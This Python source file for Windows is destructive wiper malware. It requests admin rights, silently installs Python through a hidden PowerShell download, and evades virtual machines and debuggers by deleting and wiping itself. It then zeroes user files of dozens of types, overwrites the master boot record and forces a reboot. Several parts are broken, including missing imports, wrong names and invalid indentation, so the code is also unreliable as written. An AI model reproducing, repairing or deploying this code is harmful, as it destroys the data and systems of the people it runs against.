import os 
import sys
import random
import requests
import subprocess
import ctypes
from ctypes import wintypes
import psutil
import win32api


requests.packages.urllib3.disable_warnings() # Disable ssl Warning 
startupinfo = subprocess.STARTUPINFO() #type: ignore 
drives = win32api.GetLogicalDriveStrings()
kernel32 = ctypes.WinDLL('kernel32')

def RunPwsh(code):
    p = subprocess.run(['powershell', code], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
    return p.stdout.decode()

def IsAdmin():
    """ it checks if it has Administrator privileges, if it doesn't it runs itself using the ShellExecute trick and exits immediately
        if it does, it performs the task at hand. """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def RunAsAdmin():
    ctypes.windll.shell32.IsUserAnAdmin() or (ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join(sys.argv), None, 1) > 32, sys.exit())
def Is64Bit():
    return platform.machine().endswith('64')

def IsOnline():
    try:
        x = requests.get('https://google.com', verify=False)
        return True
    except:
        return False

def IsPyExist():
        if os.path.exists(f"C:/Users/{os.getlogin()}/Appdata/Local/Programs/Python/"):
            return True

def InstallPy():
    os_p = 64
    if not Is64Bit():
        os_p = 32
    rand_py = f'python{random.randrange(111, 9999999)}.exe'
    url = "https://www.python.org/ftp/python/3.8.1/python-3.8.1-amd64.exe" if os_p == 64 else "https://www.python.org/ftp/python/3.8.1/python-3.8.1.exe"
    subprocess.run(
        f"""powershell -ep Bypass -WindowStyle Hidden -Command "iwr -Uri {url} -OutFile c:/users/$env:username/appdata/local/temp/{rand_py}" """)
    if os.path.exists(f"c:/users/{os.getlogin()}/appdata/local/temp/{rand_py}"):
        subprocess.run(
            f"c:/users/{os.getlogin()}/appdata/local/temp/{rand_py} /quiet InstallAllUsers=0 Include_launcher=0 PrependPath=1 Include_test=0")
    os.remove(f"c:/users/{os.getlogin()}/appdata/local/temp/{rand_py}")
    subprocess.run("python -m pip install --upgrade pip")
    subprocess.run("python -m pip install pyinstaller psutil")
    pip_list = RunPwsh("pip list")
    if 'psutil' in pip_list.lower():
        wait4 = os.system('msg %username% in!')
    subprocess.run("msg %username% finished")
    return True

def AntiVm():
      Process = ["vmsrvc.exe" , "vmusrvc.exe", "vboxtray.exe", "vmtoolsd.exe", "df5serv.exe", "vboxservice.exe"]
      for process in psutil.process_iter():
         for i in Process:
            if i in process.name().lower():
                return CommitSuicide()

def AntiDebug():
    isDebuggerPresent = windll.kernel32.IsDebuggerPresent()
    if (isDebuggerPresent):
        return CommitSuicide() 
         
def CommitSuicide():
    file_path = os.path.abspath(__file__) 
    os.remove(file_path)
    folder_path = os.path.dirname(file_path) 
    os.system("cipher /W:%s" % folder_path) # At the end of the script, the file is deleted & over-written

""" Stages """

Data = bytes([]) # 512 bytes

def OverWriteMBR(): 
    hDevice = Kernel32.CreateFileW("\\\\.\\PhysicalDrive0", 0x40000000, 0x00000001 | 0x00000002, None, 3, 0,0) # Create a handle to our Physical Drive
    Kernel32.WriteFile(hDevice, Data, None) # Overwrite the MBR! (Never run this on your main machine!)
    Kernel32.CloseHandle(hDevice) # Close the handle to our Physical Drive!
    

def SetFiles():
    ext = [
           ".m2ts", ".mkv", ".mov", ".mp4", ".mpg", ".mpeg",
           ".rm", ".swf", ".vob", ".wmv" ".docx", ".pdf",".rar",
           ".jpg", ".jpeg", ".png", ".tiff", ".zip", ".7z", 
           ".tar.gz", ".tar", ".mp3", ".sh", ".c", ".cpp", ".h", 
           ".gif", ".txt", ".jar", ".sql", ".bundle",
           ".sqlite3", ".html", ".php", ".log", ".bak", ".deb"] # files to seek out and overwrite
    for dirpath, dirs, files in os.walk(f"C:\\Users\\{os.getlogin()}\\{os.getcwd()}"): 
        for f in files:
            path = os.path.abspath(os.path.join(dirpath, f))
            if f.endswith(tuple(ext)): 
                with open(f, "rb") as files:
                    data = files.read()
                    files.close()
                    with open(f, "wb") as files:
                        data.write(b'\x00') # Overwrites multiple files with zero bytes (hex 00)
                        data.close()                             


def SysDown():
     # InitiateSystemShutdown()  
     os.system("shutdown -t 0 -r -f ") 

def main():
        global application_path 
        if getattr(sys, 'frozen', False):
            application_path = sys.executable
        else:
            application_path = os.path.dirname(os.path.abspath(__file__))
            AntiDebug()
            if not IsPyExist():
                    return InstallPy()
            if not IsAdmin():
                return RunAsAdmin()
                    if not IsOnline():
                        return CommitSuicide()
            if not AntiVm():
                pass
            SetFiles()
            OverWriteMBR()
if __name__ == "__main__":
    main()
    SysDown()
